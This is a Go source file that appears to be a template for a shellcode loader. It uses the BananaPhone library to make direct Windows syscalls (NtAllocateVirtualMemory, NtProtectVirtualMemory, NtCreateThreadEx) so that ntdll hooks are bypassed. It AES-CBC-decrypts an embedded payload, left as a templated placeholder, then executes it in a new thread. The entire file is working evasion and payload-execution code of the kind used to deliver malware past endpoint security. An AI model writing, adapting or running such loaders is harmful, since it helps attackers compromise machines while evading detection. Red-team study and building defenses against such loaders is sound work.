package main

import (
	"fmt"
	"bufio"
	"os"
	"syscall"
	"unsafe"
	"crypto/aes"
	"crypto/cipher"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

var shellcode = []byte{
	{{SHELLCODE}}
}

var key = []byte{
	{{KEY}}
}

//example of using bananaphone to execute shellcode in the current thread.
func main() {

	reader := bufio.NewReader(os.Stdin)
	
	//fmt.Println("Mess with the banana, die like the... banana?") //I found it easier to breakpoint the consolewrite function to mess with the in-memory ntdll to verify the auto-switch to disk works sanely than to try and live-patch it programatically.
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		panic(e)
	}
	createthread, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}

	createThread(decryptShellcode(key, shellcode), uintptr(0xffffffffffffffff), alloc, protect, createthread)
	
	input, _ := reader.ReadString('\n')
	fmt.Println("%v", string([]byte(input))[0])
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	//r1, r := 
	bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	//if r != nil {
		//fmt.Printf("1 %s %x\n", r, r1)
		//return
	//}
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	//r1, r = 
	bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	//if r != nil {
		//fmt.Printf("1 %s %x\n", r, r1)
		//return
	//}
	var hhosthread uintptr
	//r1, r = 
	bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	//if r != nil {
		//fmt.Printf("1 %s %x\n", r, r1)
		//return
	//}
}

func decryptShellcode(key []byte, ciphertext []byte) []byte {

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	
	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	// CBC mode always works in whole blocks.
	if len(ciphertext)%aes.BlockSize != 0 {
		panic("ciphertext is not a multiple of the block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)
	
	return ciphertext
}